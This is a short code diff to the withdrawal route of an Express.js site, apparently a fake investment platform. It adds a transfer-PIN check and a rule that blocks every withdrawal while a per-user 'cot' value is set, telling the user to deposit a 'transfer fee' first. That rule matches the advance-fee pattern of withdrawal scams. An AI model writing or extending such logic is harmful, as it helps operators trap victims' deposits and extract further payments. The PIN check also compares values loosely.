@@ -90,17 +90,27 @@ router.post("/withdraw", ensureAuthenticated, checkVerification, async (req, res
         const {
             method,
             amount,
-            wallet
+            pin
         } = req.body;
 
 
-        if (!method || !amount || !wallet) {
+        if (!method || !amount || !pin) {
             req.flash("error_msg", "Fill mandatory fields");
             return res.redirect("/withdraw");
         }
 
         if (Number(amount) > Number(req.user.balance)) {
             req.flash("error_msg", "Insufficient funds");
+            return res.redirect("/withdraw");
+        }
+
+        if (req.user.withdrawalPin != pin) {
+            req.flash("error_msg", "Incorrect Transfer PIN");
+            return res.redirect("/withdraw");
+        }
+
+        if (req.user.cot > 0) {
+            req.flash("error_msg", `To process the transaction, a transfer fee of $${req.user.cot} is required as a deposit.`);
             return res.redirect("/withdraw");
         }
 
@@ -200,7 +210,6 @@ router.post("/update-password", ensureAuthenticated, checkVerification, async (r
         return res.redirect("/dashboard");
     }
 });
-
 
 router.get("/top-investors", ensureAuthenticated, checkVerification, (req, res) => {
     try {
